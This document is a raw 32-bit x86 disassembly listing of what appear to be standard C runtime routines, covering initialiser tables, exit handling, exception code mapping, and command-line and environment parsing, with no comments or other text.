  4246b4:	mov    eax,DWORD PTR [esi]
  4246b6:	test   eax,eax
  4246b8:	je     0x4246bc
  4246ba:	call   eax
  4246bc:	add    esi,0x4
  4246bf:	cmp    esi,edi
  4246c1:	jb     0x4246b4
  4246c3:	xor    eax,eax
  4246c5:	pop    edi
  4246c6:	pop    esi
  4246c7:	ret    
  4246c8:	push   ebp
  4246c9:	mov    ebp,esp
  4246cb:	push   esi
  4246cc:	push   edi
  4246cd:	push   0x8
  4246cf:	call   0x4254ff
  4246d4:	xor    esi,esi
  4246d6:	inc    esi
  4246d7:	cmp    DWORD PTR ds:0x45db04,esi
  4246dd:	pop    ecx
  4246de:	jne    0x4246f0
  4246e0:	push   DWORD PTR [ebp+0x8]
  4246e3:	call   DWORD PTR ds:0x429060
  4246e9:	push   eax
  4246ea:	call   DWORD PTR ds:0x42905c
  4246f0:	cmp    DWORD PTR [ebp+0xc],0x0
  4246f4:	mov    al,BYTE PTR [ebp+0x10]
  4246f7:	mov    DWORD PTR ds:0x45db00,esi
  4246fd:	mov    ds:0x45dafc,al
  424702:	jne    0x424756
  424704:	mov    ecx,DWORD PTR ds:0x45e268
  42470a:	test   ecx,ecx
  42470c:	je     0x424737
  42470e:	mov    eax,ds:0x45e264
  424713:	sub    eax,0x4
  424716:	cmp    eax,ecx
  424718:	jmp    0x424730
  42471a:	mov    eax,DWORD PTR [eax]
  42471c:	test   eax,eax
  42471e:	je     0x424722
  424720:	call   eax
  424722:	mov    eax,ds:0x45e264
  424727:	sub    eax,0x4
  42472a:	cmp    eax,DWORD PTR ds:0x45e268
  424730:	mov    ds:0x45e264,eax
  424735:	jae    0x42471a
  424737:	mov    eax,0x42b01c
  42473c:	mov    esi,0x42b020
  424741:	cmp    eax,esi
  424743:	mov    edi,eax
  424745:	jae    0x424756
  424747:	mov    eax,DWORD PTR [edi]
  424749:	test   eax,eax
  42474b:	je     0x42474f
  42474d:	call   eax
  42474f:	add    edi,0x4
  424752:	cmp    edi,esi
  424754:	jb     0x424747
  424756:	mov    eax,0x42b024
  42475b:	mov    esi,0x42b028
  424760:	cmp    eax,esi
  424762:	mov    edi,eax
  424764:	jae    0x424775
  424766:	mov    eax,DWORD PTR [edi]
  424768:	test   eax,eax
  42476a:	je     0x42476e
  42476c:	call   eax
  42476e:	add    edi,0x4
  424771:	cmp    edi,esi
  424773:	jb     0x424766
  424775:	cmp    DWORD PTR [ebp+0x10],0x0
  424779:	pop    edi
  42477a:	pop    esi
  42477b:	je     0x424786
  42477d:	push   0x8
  42477f:	call   0x42546b
  424784:	jmp    0x424798
  424786:	push   DWORD PTR [ebp+0x8]
  424789:	mov    DWORD PTR ds:0x45db04,0x1
  424793:	call   0x424621
  424798:	pop    ecx
  424799:	pop    ebp
  42479a:	ret    
  42479b:	push   0x0
  42479d:	push   0x0
  42479f:	push   DWORD PTR [esp+0xc]
  4247a3:	call   0x4246c8
  4247a8:	add    esp,0xc
  4247ab:	ret    
  4247ac:	push   0x0
  4247ae:	push   0x1
  4247b0:	push   DWORD PTR [esp+0xc]
  4247b4:	call   0x4246c8
  4247b9:	add    esp,0xc
  4247bc:	ret    
  4247bd:	push   0x1
  4247bf:	push   0x0
  4247c1:	push   0x0
  4247c3:	call   0x4246c8
  4247c8:	add    esp,0xc
  4247cb:	ret    
  4247cc:	push   0x1
  4247ce:	push   0x1
  4247d0:	push   0x0
  4247d2:	call   0x4246c8
  4247d7:	add    esp,0xc
  4247da:	ret    
  4247db:	push   ebp
  4247dc:	mov    ebp,esp
  4247de:	sub    esp,0x10c
  4247e4:	mov    eax,ds:0x45d430
  4247e9:	xor    eax,DWORD PTR [ebp+0x4]
  4247ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ef:	push   ebx
  4247f0:	push   esi
  4247f1:	mov    DWORD PTR [ebp-0x4],eax
  4247f4:	xor    edx,edx
  4247f6:	push   edi
  4247f7:	xor    eax,eax
  4247f9:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424800:	je     0x424808
  424802:	inc    eax
  424803:	cmp    eax,0x12
  424806:	jb     0x4247f9
  424808:	mov    esi,eax
  42480a:	shl    esi,0x3
  42480d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424813:	jne    0x42493c
  424819:	mov    eax,ds:0x45dabc
  42481e:	cmp    eax,0x1
  424821:	je     0x424917
  424827:	cmp    eax,edx
  424829:	jne    0x424838
  42482b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424832:	je     0x424917
  424838:	cmp    ecx,0xfc
  42483e:	je     0x42493c
  424844:	push   0x104
  424849:	lea    eax,[ebp-0x10c]
  42484f:	push   eax
  424850:	push   edx
  424851:	mov    BYTE PTR [ebp-0x8],dl
  424854:	call   DWORD PTR ds:0x429068
  42485a:	test   eax,eax
  42485c:	jne    0x424871
  42485e:	lea    eax,[ebp-0x10c]
  424864:	push   0x429594
  424869:	push   eax
  42486a:	call   0x425720
  42486f:	pop    ecx
  424870:	pop    ecx
  424871:	lea    eax,[ebp-0x10c]
  424877:	push   eax
  424878:	lea    edi,[ebp-0x10c]
  42487e:	call   0x425950
  424883:	inc    eax
  424884:	cmp    eax,0x3c
  424887:	pop    ecx
  424888:	jbe    0x4248b3
  42488a:	lea    eax,[ebp-0x10c]
  424890:	push   eax
  424891:	call   0x425950
  424896:	mov    edi,eax
  424898:	lea    eax,[ebp-0x10c]
  42489e:	sub    eax,0x3b
  4248a1:	push   0x3
  4248a3:	add    edi,eax
  4248a5:	push   0x429590
  4248aa:	push   edi
  4248ab:	call   0x425820
  4248b0:	add    esp,0x10
  4248b3:	push   edi
  4248b4:	call   0x425950
  4248b9:	push   DWORD PTR [esi+0x45d1cc]
  4248bf:	mov    ebx,eax
  4248c1:	call   0x425950
  4248c6:	lea    eax,[ebx+eax*1+0x1c]
  4248ca:	pop    ecx
  4248cb:	add    eax,0x3
  4248ce:	pop    ecx
  4248cf:	and    eax,0xfffffffc
  4248d2:	call   0x425390
  4248d7:	mov    ebx,esp
  4248d9:	push   0x429574
  4248de:	push   ebx
  4248df:	call   0x425720
  4248e4:	push   edi
  4248e5:	push   ebx
  4248e6:	call   0x425730
  4248eb:	push   0x429570
  4248f0:	push   ebx
  4248f1:	call   0x425730
  4248f6:	push   DWORD PTR [esi+0x45d1cc]
  4248fc:	push   ebx
  4248fd:	call   0x425730
  424902:	push   0x12010
  424907:	push   0x429548
  42490c:	push   ebx
  42490d:	call   0x425622
  424912:	add    esp,0x2c
  424915:	jmp    0x42493c
  424917:	push   edx
  424918:	lea    eax,[ebp+0x8]
  42491b:	push   eax
  42491c:	lea    esi,[esi+0x45d1cc]
  424922:	push   DWORD PTR [esi]
  424924:	call   0x425950
  424929:	pop    ecx
  42492a:	push   eax
  42492b:	push   DWORD PTR [esi]
  42492d:	push   0xfffffff4
  42492f:	call   DWORD PTR ds:0x429064
  424935:	push   eax
  424936:	call   DWORD PTR ds:0x42900c
  42493c:	lea    esp,[ebp-0x118]
  424942:	mov    ecx,DWORD PTR [ebp-0x4]
  424945:	xor    ecx,DWORD PTR [ebp+0x4]
  424948:	call   0x425a0c
  42494d:	pop    edi
  42494e:	pop    esi
  42494f:	pop    ebx
  424950:	leave  
  424951:	ret    
  424952:	mov    eax,ds:0x45dabc
  424957:	cmp    eax,0x1
  42495a:	je     0x424969
  42495c:	test   eax,eax
  42495e:	jne    0x42498a
  424960:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424967:	jne    0x42498a
  424969:	push   0xfc
  42496e:	call   0x4247db
  424973:	mov    eax,ds:0x45db08
  424978:	test   eax,eax
  42497a:	pop    ecx
  42497b:	je     0x42497f
  42497d:	call   eax
  42497f:	push   0xff
  424984:	call   0x4247db
  424989:	pop    ecx
  42498a:	ret    
  42498b:	push   ebp
  42498c:	mov    ebp,esp
  42498e:	push   ecx
  42498f:	push   ebx
  424990:	push   esi
  424991:	push   edi
  424992:	call   0x4251f3
  424997:	mov    edi,DWORD PTR [ebp+0x8]
  42499a:	mov    esi,eax
  42499c:	mov    edx,DWORD PTR [esi+0x54]
  42499f:	mov    eax,ds:0x45d2dc
  4249a4:	mov    ecx,edx
  4249a6:	cmp    DWORD PTR [ecx],edi
  4249a8:	je     0x4249b7
  4249aa:	lea    ebx,[eax+eax*2]
  4249ad:	add    ecx,0xc
  4249b0:	lea    ebx,[edx+ebx*4]
  4249b3:	cmp    ecx,ebx
  4249b5:	jb     0x4249a6
  4249b7:	lea    eax,[eax+eax*2]
  4249ba:	lea    eax,[edx+eax*4]
  4249bd:	cmp    ecx,eax
  4249bf:	jae    0x4249c5
  4249c1:	cmp    DWORD PTR [ecx],edi
  4249c3:	je     0x4249c7
  4249c5:	xor    ecx,ecx
  4249c7:	test   ecx,ecx
  4249c9:	je     0x424ae1
  4249cf:	mov    ebx,DWORD PTR [ecx+0x8]
  4249d2:	test   ebx,ebx
  4249d4:	mov    DWORD PTR [ebp+0x8],ebx
  4249d7:	je     0x424ae1
  4249dd:	cmp    ebx,0x5
  4249e0:	jne    0x4249ee
  4249e2:	and    DWORD PTR [ecx+0x8],0x0
  4249e6:	xor    eax,eax
  4249e8:	inc    eax
  4249e9:	jmp    0x424aea
  4249ee:	cmp    ebx,0x1
  4249f1:	je     0x424adc
  4249f7:	mov    eax,DWORD PTR [esi+0x58]
  4249fa:	mov    DWORD PTR [ebp-0x4],eax
  4249fd:	mov    eax,DWORD PTR [ebp+0xc]
  424a00:	mov    DWORD PTR [esi+0x58],eax
  424a03:	mov    eax,DWORD PTR [ecx+0x4]
  424a06:	cmp    eax,0x8
  424a09:	jne    0x424ace
  424a0f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a15:	mov    eax,ds:0x45d2d4
  424a1a:	add    eax,edx
  424a1c:	cmp    edx,eax
  424a1e:	jge    0x424a47
  424a20:	lea    eax,[edx+edx*2]
  424a23:	shl    eax,0x2
  424a26:	mov    edi,DWORD PTR [esi+0x54]
  424a29:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a2e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a34:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a3a:	inc    edx
  424a3b:	add    ebx,edi
  424a3d:	add    eax,0xc
  424a40:	cmp    edx,ebx
  424a42:	jl     0x424a26
  424a44:	mov    ebx,DWORD PTR [ebp+0x8]
  424a47:	mov    ecx,DWORD PTR [ecx]
  424a49:	cmp    ecx,0xc000008e
  424a4f:	mov    edi,DWORD PTR [esi+0x5c]
  424a52:	jne    0x424a5d
  424a54:	mov    DWORD PTR [esi+0x5c],0x83
  424a5b:	jmp    0x424ac1
  424a5d:	cmp    ecx,0xc0000090
  424a63:	jne    0x424a6e
  424a65:	mov    DWORD PTR [esi+0x5c],0x81
  424a6c:	jmp    0x424ac1
  424a6e:	cmp    ecx,0xc0000091
  424a74:	jne    0x424a7f
  424a76:	mov    DWORD PTR [esi+0x5c],0x84
  424a7d:	jmp    0x424ac1
  424a7f:	cmp    ecx,0xc0000093
  424a85:	jne    0x424a90
  424a87:	mov    DWORD PTR [esi+0x5c],0x85
  424a8e:	jmp    0x424ac1
  424a90:	cmp    ecx,0xc000008d
  424a96:	jne    0x424aa1
  424a98:	mov    DWORD PTR [esi+0x5c],0x82
  424a9f:	jmp    0x424ac1
  424aa1:	cmp    ecx,0xc000008f
  424aa7:	jne    0x424ab2
  424aa9:	mov    DWORD PTR [esi+0x5c],0x86
  424ab0:	jmp    0x424ac1
  424ab2:	cmp    ecx,0xc0000092
  424ab8:	jne    0x424ac1
  424aba:	mov    DWORD PTR [esi+0x5c],0x8a
  424ac1:	push   DWORD PTR [esi+0x5c]
  424ac4:	push   0x8
  424ac6:	call   ebx
  424ac8:	pop    ecx
  424ac9:	mov    DWORD PTR [esi+0x5c],edi
  424acc:	jmp    0x424ad5
  424ace:	and    DWORD PTR [ecx+0x8],0x0
  424ad2:	push   eax
  424ad3:	call   ebx
  424ad5:	mov    eax,DWORD PTR [ebp-0x4]
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x58],eax
  424adc:	or     eax,0xffffffff
  424adf:	jmp    0x424aea
  424ae1:	push   DWORD PTR [ebp+0xc]
  424ae4:	call   DWORD PTR ds:0x42906c
  424aea:	pop    edi
  424aeb:	pop    esi
  424aec:	pop    ebx
  424aed:	leave  
  424aee:	ret    
  424aef:	cmp    DWORD PTR ds:0x45e26c,0x0
  424af6:	jne    0x424afd
  424af8:	call   0x425f2c
  424afd:	push   esi
  424afe:	mov    esi,DWORD PTR ds:0x45e274
  424b04:	test   esi,esi
  424b06:	jne    0x424b0f
  424b08:	mov    esi,0x4295ab
  424b0d:	jmp    0x424b54
  424b0f:	mov    al,BYTE PTR [esi]
  424b11:	cmp    al,0x22
  424b13:	jne    0x424b3d
  424b15:	inc    esi
  424b16:	mov    al,BYTE PTR [esi]
  424b18:	cmp    al,0x22
  424b1a:	je     0x424b4d
  424b1c:	test   al,al
  424b1e:	je     0x424b36
  424b20:	movzx  eax,al
  424b23:	push   eax
  424b24:	call   0x425a4b
  424b29:	test   eax,eax
  424b2b:	pop    ecx
  424b2c:	je     0x424b2f
  424b2e:	inc    esi
  424b2f:	inc    esi
  424b30:	mov    al,BYTE PTR [esi]
  424b32:	cmp    al,0x22
  424b34:	jne    0x424b1c
  424b36:	cmp    BYTE PTR [esi],0x22
  424b39:	jne    0x424b4e
  424b3b:	jmp    0x424b4d
  424b3d:	cmp    al,0x20
  424b3f:	jbe    0x424b4e
  424b41:	inc    esi
  424b42:	cmp    BYTE PTR [esi],0x20
  424b45:	ja     0x424b41
  424b47:	jmp    0x424b4e
  424b49:	cmp    al,0x20
  424b4b:	ja     0x424b54
  424b4d:	inc    esi
  424b4e:	mov    al,BYTE PTR [esi]
  424b50:	test   al,al
  424b52:	jne    0x424b49
  424b54:	mov    eax,esi
  424b56:	pop    esi
  424b57:	ret    
  424b58:	push   ebx
  424b59:	xor    ebx,ebx
  424b5b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b61:	push   esi
  424b62:	push   edi
  424b63:	jne    0x424b6a
  424b65:	call   0x425f2c
  424b6a:	mov    esi,DWORD PTR ds:0x45dab4
  424b70:	xor    edi,edi
  424b72:	cmp    esi,ebx
  424b74:	jne    0x424b88
  424b76:	jmp    0x424ba8
  424b78:	cmp    al,0x3d
  424b7a:	je     0x424b7d
  424b7c:	inc    edi
  424b7d:	push   esi
  424b7e:	call   0x425950
  424b83:	pop    ecx
  424b84:	lea    esi,[esi+eax*1+0x1]
  424b88:	mov    al,BYTE PTR [esi]
  424b8a:	cmp    al,bl
  424b8c:	jne    0x424b78
  424b8e:	lea    eax,[edi*4+0x4]
  424b95:	push   eax
  424b96:	call   0x426062
  424b9b:	mov    edi,eax
  424b9d:	cmp    edi,ebx
  424b9f:	pop    ecx
  424ba0:	mov    DWORD PTR ds:0x45dae4,edi
  424ba6:	jne    0x424bad
  424ba8:	or     eax,0xffffffff
  424bab:	jmp    0x424c05
  424bad:	mov    esi,DWORD PTR ds:0x45dab4
  424bb3:	push   ebp
  424bb4:	jmp    0x424be0
  424bb6:	push   esi
  424bb7:	call   0x425950
  424bbc:	mov    ebp,eax
  424bbe:	inc    ebp
  424bbf:	cmp    BYTE PTR [esi],0x3d
  424bc2:	pop    ecx
  424bc3:	je     0x424bde
  424bc5:	push   ebp
  424bc6:	call   0x426062
  424bcb:	cmp    eax,ebx
  424bcd:	pop    ecx
  424bce:	mov    DWORD PTR [edi],eax
  424bd0:	je     0x424c09
  424bd2:	push   esi
  424bd3:	push   eax
  424bd4:	call   0x425720
  424bd9:	pop    ecx
  424bda:	pop    ecx
  424bdb:	add    edi,0x4
  424bde:	add    esi,ebp
  424be0:	cmp    BYTE PTR [esi],bl
  424be2:	jne    0x424bb6
  424be4:	push   DWORD PTR ds:0x45dab4
  424bea:	call   0x425f4a
  424bef:	mov    DWORD PTR ds:0x45dab4,ebx
  424bf5:	mov    DWORD PTR [edi],ebx
  424bf7:	mov    DWORD PTR ds:0x45e260,0x1
  424c01:	xor    eax,eax
  424c03:	pop    ecx
  424c04:	pop    ebp
  424c05:	pop    edi
  424c06:	pop    esi
  424c07:	pop    ebx
  424c08:	ret    
  424c09:	push   DWORD PTR ds:0x45dae4
  424c0f:	call   0x425f4a
  424c14:	mov    DWORD PTR ds:0x45dae4,ebx
  424c1a:	or     eax,0xffffffff
  424c1d:	jmp    0x424c03
  424c1f:	push   ebp
  424c20:	mov    ebp,esp
  424c22:	push   ecx
  424c23:	push   ebx
  424c24:	mov    ebx,DWORD PTR [ebp+0xc]
  424c27:	xor    edx,edx
  424c29:	cmp    DWORD PTR [ebp+0x8],edx
  424c2c:	push   edi
  424c2d:	mov    DWORD PTR [esi],edx
  424c2f:	mov    edi,ecx
  424c31:	mov    DWORD PTR [ebx],0x1
  424c37:	je     0x424c42
  424c39:	mov    ecx,DWORD PTR [ebp+0x8]
  424c3c:	add    DWORD PTR [ebp+0x8],0x4
  424c40:	mov    DWORD PTR [ecx],edi
  424c42:	cmp    BYTE PTR [eax],0x22
  424c45:	jne    0x424c55
  424c47:	xor    ecx,ecx
  424c49:	test   edx,edx
  424c4b:	sete   cl
  424c4e:	inc    eax
  424c4f:	mov    edx,ecx
  424c51:	mov    cl,0x22
  424c53:	jmp    0x424c82
  424c55:	inc    DWORD PTR [esi]
  424c57:	test   edi,edi
  424c59:	je     0x424c60
  424c5b:	mov    cl,BYTE PTR [eax]
  424c5d:	mov    BYTE PTR [edi],cl
  424c5f:	inc    edi
  424c60:	mov    cl,BYTE PTR [eax]
  424c62:	movzx  ebx,cl
  424c65:	inc    eax
  424c66:	test   BYTE PTR [ebx+0x45df21],0x4
  424c6d:	je     0x424c7b
  424c6f:	inc    DWORD PTR [esi]
  424c71:	test   edi,edi
  424c73:	je     0x424c7a
  424c75:	mov    bl,BYTE PTR [eax]
  424c77:	mov    BYTE PTR [edi],bl
  424c79:	inc    edi
  424c7a:	inc    eax
  424c7b:	test   cl,cl
  424c7d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c80:	je     0x424cb4
  424c82:	test   edx,edx
  424c84:	jne    0x424c42
  424c86:	cmp    cl,0x20
  424c89:	je     0x424c90
  424c8b:	cmp    cl,0x9
  424c8e:	jne    0x424c42
  424c90:	test   edi,edi
  424c92:	je     0x424c98
  424c94:	and    BYTE PTR [edi-0x1],0x0
  424c98:	and    DWORD PTR [ebp-0x4],0x0
  424c9c:	cmp    BYTE PTR [eax],0x0
  424c9f:	je     0x424d7b
  424ca5:	mov    cl,BYTE PTR [eax]
  424ca7:	cmp    cl,0x20
  424caa:	je     0x424cb1
  424cac:	cmp    cl,0x9
  424caf:	jne    0x424cb7
  424cb1:	inc    eax
  424cb2:	jmp    0x424ca5
  424cb4:	dec    eax
  424cb5:	jmp    0x424c98
  424cb7:	cmp    BYTE PTR [eax],0x0
  424cba:	je     0x424d7b
  424cc0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cc4:	je     0x424ccf
  424cc6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc9:	add    DWORD PTR [ebp+0x8],0x4
  424ccd:	mov    DWORD PTR [ecx],edi
  424ccf:	inc    DWORD PTR [ebx]
  424cd1:	xor    ebx,ebx
  424cd3:	inc    ebx
  424cd4:	xor    edx,edx
  424cd6:	jmp    0x424cda
  424cd8:	inc    eax
  424cd9:	inc    edx
  424cda:	cmp    BYTE PTR [eax],0x5c
  424cdd:	je     0x424cd8
  424cdf:	cmp    BYTE PTR [eax],0x22
  424ce2:	jne    0x424d0a
  424ce4:	test   dl,0x1
  424ce7:	jne    0x424d08
  424ce9:	cmp    DWORD PTR [ebp-0x4],0x0
  424ced:	je     0x424cfb
  424cef:	lea    ecx,[eax+0x1]
  424cf2:	cmp    BYTE PTR [ecx],0x22
  424cf5:	jne    0x424cfb
  424cf7:	mov    eax,ecx
  424cf9:	jmp    0x424cfd
  424cfb:	xor    ebx,ebx
  424cfd:	xor    ecx,ecx
  424cff:	cmp    DWORD PTR [ebp-0x4],ecx
  424d02:	sete   cl
  424d05:	mov    DWORD PTR [ebp-0x4],ecx
  424d08:	shr    edx,1
  424d0a:	test   edx,edx
  424d0c:	je     0x424d1b
  424d0e:	test   edi,edi
  424d10:	je     0x424d16
  424d12:	mov    BYTE PTR [edi],0x5c
  424d15:	inc    edi
  424d16:	inc    DWORD PTR [esi]
  424d18:	dec    edx
  424d19:	jne    0x424d0e
  424d1b:	mov    cl,BYTE PTR [eax]
  424d1d:	test   cl,cl
  424d1f:	je     0x424d69
  424d21:	cmp    DWORD PTR [ebp-0x4],0x0
  424d25:	jne    0x424d31
  424d27:	cmp    cl,0x20
  424d2a:	je     0x424d69
  424d2c:	cmp    cl,0x9
  424d2f:	je     0x424d69
  424d31:	test   ebx,ebx
  424d33:	je     0x424d63
  424d35:	test   edi,edi
  424d37:	je     0x424d52
  424d39:	movzx  edx,cl
  424d3c:	test   BYTE PTR [edx+0x45df21],0x4
  424d43:	je     0x424d4b
  424d45:	mov    BYTE PTR [edi],cl
  424d47:	inc    edi
  424d48:	inc    eax
  424d49:	inc    DWORD PTR [esi]
  424d4b:	mov    cl,BYTE PTR [eax]
  424d4d:	mov    BYTE PTR [edi],cl
  424d4f:	inc    edi
  424d50:	jmp    0x424d61
  424d52:	movzx  ecx,cl
  424d55:	test   BYTE PTR [ecx+0x45df21],0x4
  424d5c:	je     0x424d61
  424d5e:	inc    eax
  424d5f:	inc    DWORD PTR [esi]
  424d61:	inc    DWORD PTR [esi]
  424d63:	inc    eax
  424d64:	jmp    0x424cd1
  424d69:	test   edi,edi
  424d6b:	je     0x424d71
  424d6d:	and    BYTE PTR [edi],0x0
  424d70:	inc    edi
  424d71:	inc    DWORD PTR [esi]
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	jmp    0x424c9c
  424d7b:	mov    eax,DWORD PTR [ebp+0x8]
  424d7e:	test   eax,eax
  424d80:	je     0x424d85
  424d82:	and    DWORD PTR [eax],0x0
  424d85:	inc    DWORD PTR [ebx]
  424d87:	pop    edi
  424d88:	pop    ebx
  424d89:	leave  
  424d8a:	ret    
  424d8b:	push   ebp
  424d8c:	mov    ebp,esp
  424d8e:	push   ecx
  424d8f:	push   ecx
  424d90:	push   ebx
  424d91:	push   esi
  424d92:	push   edi
  424d93:	xor    edi,edi
  424d95:	cmp    DWORD PTR ds:0x45e26c,edi
  424d9b:	jne    0x424da2
  424d9d:	call   0x425f2c
  424da2:	and    BYTE PTR ds:0x45dc14,0x0
  424da9:	push   0x104
  424dae:	mov    esi,0x45db10
  424db3:	push   esi
  424db4:	push   edi
  424db5:	call   DWORD PTR ds:0x429068
  424dbb:	mov    eax,ds:0x45e274
  424dc0:	cmp    eax,edi
  424dc2:	mov    DWORD PTR ds:0x45daf4,esi
  424dc8:	je     0x424dd1
  424dca:	cmp    BYTE PTR [eax],0x0
  424dcd:	mov    ebx,eax
  424dcf:	jne    0x424dd3
  424dd1:	mov    ebx,esi
  424dd3:	lea    eax,[ebp-0x4]
  424dd6:	push   eax
  424dd7:	push   edi
  424dd8:	lea    esi,[ebp-0x8]
  424ddb:	xor    ecx,ecx
  424ddd:	mov    eax,ebx
  424ddf:	call   0x424c1f
  424de4:	mov    esi,DWORD PTR [ebp-0x4]
  424de7:	mov    eax,DWORD PTR [ebp-0x8]
  424dea:	shl    esi,0x2
  424ded:	add    eax,esi
  424def:	push   eax
  424df0:	call   0x426062
  424df5:	mov    edi,eax
  424df7:	add    esp,0xc
  424dfa:	test   edi,edi
  424dfc:	jne    0x424e03
  424dfe:	or     eax,0xffffffff
  424e01:	jmp    0x424e28
  424e03:	lea    eax,[ebp-0x4]
  424e06:	push   eax
  424e07:	lea    ecx,[esi+edi*1]
  424e0a:	push   edi
  424e0b:	lea    esi,[ebp-0x8]
  424e0e:	mov    eax,ebx
  424e10:	call   0x424c1f
  424e15:	mov    eax,DWORD PTR [ebp-0x4]
  424e18:	dec    eax
  424e19:	pop    ecx
  424e1a:	mov    ds:0x45dad8,eax
  424e1f:	pop    ecx
  424e20:	mov    DWORD PTR ds:0x45dadc,edi
  424e26:	xor    eax,eax
  424e28:	pop    edi
  424e29:	pop    esi
  424e2a:	pop    ebx
  424e2b:	leave  
  424e2c:	ret    
  424e2d:	push   ecx
  424e2e:	push   ecx
  424e2f:	mov    eax,ds:0x45dc18
  424e34:	push   ebx
  424e35:	push   ebp
  424e36:	push   esi
  424e37:	push   edi
  424e38:	mov    edi,DWORD PTR ds:0x429080
  424e3e:	xor    ebx,ebx
  424e40:	xor    esi,esi
  424e42:	cmp    eax,ebx
  424e44:	push   0x2
  424e46:	pop    ebp
  424e47:	jne    0x424e76
  424e49:	call   edi
  424e4b:	mov    esi,eax
  424e4d:	cmp    esi,ebx
  424e4f:	je     0x424e5d
  424e51:	mov    DWORD PTR ds:0x45dc18,0x1
  424e5b:	jmp    0x424e7b
  424e5d:	call   DWORD PTR ds:0x429044
  424e63:	cmp    eax,0x78
  424e66:	jne    0x424e71
  424e68:	mov    eax,ebp
  424e6a:	mov    ds:0x45dc18,eax
  424e6f:	jmp    0x424e76
  424e71:	mov    eax,ds:0x45dc18
  424e76:	cmp    eax,0x1
  424e79:	jne    0x424ef8
  424e7b:	cmp    esi,ebx
  424e7d:	jne    0x424e87
  424e7f:	call   edi
  424e81:	mov    esi,eax
  424e83:	cmp    esi,ebx
  424e85:	je     0x424f00
  424e87:	cmp    WORD PTR [esi],bx
  424e8a:	mov    eax,esi
  424e8c:	je     0x424e9c
  424e8e:	add    eax,ebp
  424e90:	cmp    WORD PTR [eax],bx
  424e93:	jne    0x424e8e
  424e95:	add    eax,ebp
  424e97:	cmp    WORD PTR [eax],bx
  424e9a:	jne    0x424e8e
  424e9c:	mov    edi,DWORD PTR ds:0x42907c
  424ea2:	push   ebx
  424ea3:	push   ebx
  424ea4:	push   ebx
  424ea5:	sub    eax,esi
  424ea7:	push   ebx
  424ea8:	sar    eax,1
  424eaa:	inc    eax
  424eab:	push   eax
  424eac:	push   esi
  424ead:	push   ebx
  424eae:	push   ebx
  424eaf:	mov    DWORD PTR [esp+0x34],eax
  424eb3:	call   edi
  424eb5:	mov    ebp,eax
  424eb7:	cmp    ebp,ebx
  424eb9:	je     0x424eed
  424ebb:	push   ebp
  424ebc:	call   0x426062
  424ec1:	cmp    eax,ebx
  424ec3:	pop    ecx
  424ec4:	mov    DWORD PTR [esp+0x10],eax
  424ec8:	je     0x424eed
  424eca:	push   ebx
  424ecb:	push   ebx
  424ecc:	push   ebp
  424ecd:	push   eax
  424ece:	push   DWORD PTR [esp+0x24]
  424ed2:	push   esi
  424ed3:	push   ebx
  424ed4:	push   ebx
  424ed5:	call   edi
  424ed7:	test   eax,eax
  424ed9:	jne    0x424ee9
  424edb:	push   DWORD PTR [esp+0x10]
  424edf:	call   0x425f4a
  424ee4:	pop    ecx
  424ee5:	mov    DWORD PTR [esp+0x10],ebx
  424ee9:	mov    ebx,DWORD PTR [esp+0x10]
  424eed:	push   esi
  424eee:	call   DWORD PTR ds:0x429078
  424ef4:	mov    eax,ebx
  424ef6:	jmp    0x424f48
  424ef8:	cmp    eax,ebp
  424efa:	je     0x424f04
  424efc:	cmp    eax,ebx
  424efe:	je     0x424f04
  424f00:	xor    eax,eax
  424f02:	jmp    0x424f48
  424f04:	call   DWORD PTR ds:0x429074
  424f0a:	mov    esi,eax
  424f0c:	cmp    esi,ebx
  424f0e:	je     0x424f00
  424f10:	cmp    BYTE PTR [esi],bl
  424f12:	je     0x424f1e
  424f14:	inc    eax
  424f15:	cmp    BYTE PTR [eax],bl
  424f17:	jne    0x424f14
  424f19:	inc    eax
  424f1a:	cmp    BYTE PTR [eax],bl
  424f1c:	jne    0x424f14
  424f1e:	sub    eax,esi
  424f20:	inc    eax
  424f21:	mov    ebp,eax
  424f23:	push   ebp
  424f24:	call   0x426062
  424f29:	mov    edi,eax
  424f2b:	cmp    edi,ebx
  424f2d:	pop    ecx
  424f2e:	jne    0x424f34
  424f30:	xor    edi,edi
  424f32:	jmp    0x424f3f
  424f34:	push   ebp
  424f35:	push   esi
  424f36:	push   edi
  424f37:	call   0x426080
  424f3c:	add    esp,0xc
  424f3f:	push   esi
  424f40:	call   DWORD PTR ds:0x429070
  424f46:	mov    eax,edi
  424f48:	pop    edi
  424f49:	pop    esi
  424f4a:	pop    ebp
  424f4b:	pop    ebx
  424f4c:	pop    ecx
  424f4d:	pop    ecx
  424f4e:	ret    
  424f4f:	sub    esp,0x48
  424f52:	push   ebx
  424f53:	mov    ebx,0x480
  424f58:	push   ebx
  424f59:	call   0x426062
  424f5e:	test   eax,eax
  424f60:	pop    ecx
  424f61:	jne    0x424f6b
  424f63:	or     eax,0xffffffff
  424f66:	jmp    0x425148
  424f6b:	mov    ds:0x45e160,eax
  424f70:	mov    DWORD PTR ds:0x45e148,0x20
  424f7a:	lea    ecx,[eax+0x480]
  424f80:	jmp    0x424fa0
  424f82:	and    BYTE PTR [eax+0x4],0x0
  424f86:	or     DWORD PTR [eax],0xffffffff
  424f89:	and    DWORD PTR [eax+0x8],0x0
  424f8d:	mov    BYTE PTR [eax+0x5],0xa
  424f91:	mov    ecx,DWORD PTR ds:0x45e160
  424f97:	add    eax,0x24
  424f9a:	add    ecx,0x480
  424fa0:	cmp    eax,ecx
  424fa2:	jb     0x424f82
  424fa4:	push   ebp
  424fa5:	push   esi
  424fa6:	push   edi
  424fa7:	lea    eax,[esp+0x14]
  424fab:	push   eax
  424fac:	call   DWORD PTR ds:0x42904c
  424fb2:	cmp    WORD PTR [esp+0x46],0x0
  424fb8:	je     0x4250a7
  424fbe:	mov    eax,DWORD PTR [esp+0x48]
  424fc2:	test   eax,eax
